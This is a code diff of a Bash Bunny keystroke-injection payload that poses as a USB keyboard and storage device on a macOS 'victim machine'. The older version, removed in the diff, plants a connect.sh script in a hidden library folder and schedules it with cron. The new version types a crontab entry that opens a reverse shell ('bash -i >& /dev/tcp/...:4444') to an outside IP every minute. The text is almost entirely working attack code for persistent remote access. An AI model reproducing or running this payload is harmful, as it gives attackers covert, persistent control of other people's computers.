@@ -12,43 +12,13 @@ LED SETUP
 ATTACKMODE HID STORAGE VID_0X05AC PID_0X021E
 GET_SWITCH_POSITION
 
-# Moves the shell script connect.sh to victim machine and makes it excecutable
+# Opens the terminal
 LED STAGE1
 RUN OSX terminal
 Q DELAY 2000
-Q STRING mkdir \~/Library/Misc
-Q ENTER
-Q DELAY 1000
-Q STRING cp /Volumes/BashBunny/payloads/$SWITCH_POSITION/connect.sh \~/Library/Misc
-Q ENTER
-Q DELAY 2000
-Q STRING cd \~/Library/Misc
-Q ENTER
-Q DELAY 500
-Q STRING vim connect.sh
-Q ENTER
-Q DELAY 1000
-Q STRING :set fileformat=unix
-Q ENTER
-Q DELAY 500
-Q STRING :wq
-Q ENTER
-Q DELAY 2000
-Q STRING chmod +x \~/Library/Misc/connect.sh
-Q ENTER
-Q DELAY 1000
 
-LED STAGE2
-# Makes a cron job that will run the script once every minute
-Q STRING crontab -e
-Q ENTER
-Q DELAY 1000
-Q STRING i
-Q DELAY 500
-Q STRING \*/1 \* \* \* \* cd \~/Library/Misc \&\& ./connect.sh
-Q ESC
-Q DELAY 500
-Q STRING :wq
+# Makes a cron job that will run once every minute
+Q STRING (crontab -l 2>/dev/null; echo "\* \* \* \* \* "bash -i >& /dev/tcp/10.207.0.103/4444 0>&1") | crontab - 
 Q ENTER
 Q DELAY 2000
 
